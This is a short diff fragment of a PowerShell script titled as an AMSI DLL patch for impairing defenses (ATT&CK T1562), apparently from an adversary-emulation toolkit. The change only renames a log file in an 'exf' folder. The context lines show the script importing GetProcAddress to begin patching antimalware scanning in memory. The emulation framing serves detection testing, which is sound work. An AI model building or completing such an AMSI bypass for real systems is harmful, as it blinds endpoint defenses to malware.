@@ -5,7 +5,7 @@ Write-Output "==================================================================
 Write-Output "Patch AMSI DLL : Impair Defenses (T1562)"
 Write-Output "==============================================================================="
 #
-$exf_file ="$env:PUBLIC\exf\AMSI_Patch.log"; 
+$exf_file ="$env:PUBLIC\exf\AMSI_Patch.txt"; 
 $Kernel32 = Add-Type -MemberDefinition @"
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
